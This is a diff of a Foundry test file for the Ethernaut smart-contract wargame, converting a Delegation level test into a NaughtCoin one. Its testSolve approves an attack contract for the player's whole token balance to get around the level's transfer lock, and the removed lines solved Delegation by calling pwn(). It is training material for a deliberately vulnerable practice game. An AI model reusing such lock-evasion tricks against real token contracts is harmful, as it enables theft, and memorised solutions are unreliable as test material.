@@ -4,14 +4,15 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import {Utils} from "test/utils/Utils.sol";
 
-import {Delegation} from "src/levels/Delegation.sol";
-import {DelegationFactory} from "src/levels/DelegationFactory.sol";
+import {NaughtCoin} from "src/levels/NaughtCoin.sol";
+import {NaughtCoinFactory} from "src/levels/NaughtCoinFactory.sol";
+import {NaughtCoinAttack} from "src/attacks/NaughtCoinAttack.sol";
 import {Level} from "src/levels/base/Level.sol";
 import {Ethernaut} from "src/Ethernaut.sol";
 
-contract TestDelegation is Test, Utils {
+contract TestNaughtCoin is Test, Utils {
     Ethernaut ethernaut;
-    Delegation instance;
+    NaughtCoin instance;
 
     address payable owner;
     address payable player;
@@ -31,12 +32,12 @@ contract TestDelegation is Test, Utils {
 
         vm.startPrank(owner);
         ethernaut = getEthernautWithStatsProxy(owner);
-        DelegationFactory factory = new DelegationFactory();
+        NaughtCoinFactory factory = new NaughtCoinFactory();
         ethernaut.registerLevel(Level(address(factory)));
         vm.stopPrank();
 
         vm.startPrank(player);
-        instance = Delegation(createLevelInstance(ethernaut, Level(address(factory)), 0));
+        instance = NaughtCoin(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
         vm.stopPrank();
     }
 
@@ -46,7 +47,7 @@ contract TestDelegation is Test, Utils {
 
     /// @notice Check the intial state of the level and enviroment.
     function testInit() public {
-        vm.prank(player);
+        vm.startPrank(player);
         assertFalse(submitLevelInstance(ethernaut, address(instance)));
     }
 
@@ -54,8 +55,9 @@ contract TestDelegation is Test, Utils {
     function testSolve() public {
         vm.startPrank(player);
 
-        (bool success,) = address(instance).call(abi.encodeWithSignature("pwn()"));
-        require(success, "call not successful");
+        NaughtCoinAttack attacker = new NaughtCoinAttack();
+        instance.approve(address(attacker), instance.balanceOf(player));
+        attacker.attack(address(instance), player);
 
         assertTrue(submitLevelInstance(ethernaut, address(instance)));
     }
